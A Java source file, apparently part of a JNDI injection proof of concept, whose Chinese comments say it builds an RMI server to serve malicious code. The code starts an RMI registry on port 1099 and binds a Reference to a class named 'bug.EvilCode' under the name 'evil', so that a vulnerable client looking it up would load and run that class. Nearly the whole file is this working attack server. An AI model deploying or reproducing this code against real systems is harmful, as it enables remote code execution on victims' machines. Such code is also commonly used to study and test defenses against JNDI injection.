package bug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.SneakyThrows;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 构建RMI服务来响应恶意代码
 * <p>
 * Java RMI，即 远程方法调用（Remote Method Invocation），一种用于实现远程过程调用(RPC)的Java API， 能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于(JVM)，因此它仅支持从一个JVM到另一个JVM的调用。
 */
public class RMIServer {
  @SneakyThrows
  public static void main(String... args) {
    try {
      // 本地主机上的远程对象注册表Registry的实例,默认端口1099
      LocateRegistry.createRegistry(1099);
      Registry registry = LocateRegistry.getRegistry();
      System.out.println("Create RMI registry on port 1099");
      //返回的Java对象
      Reference reference = new Reference("bug.EvilCode", "bug.EvilCode", null);
      ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
      // 把远程对象注册到RMI注册服务器上，并命名为evil
      registry.bind("evil", referenceWrapper);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

}
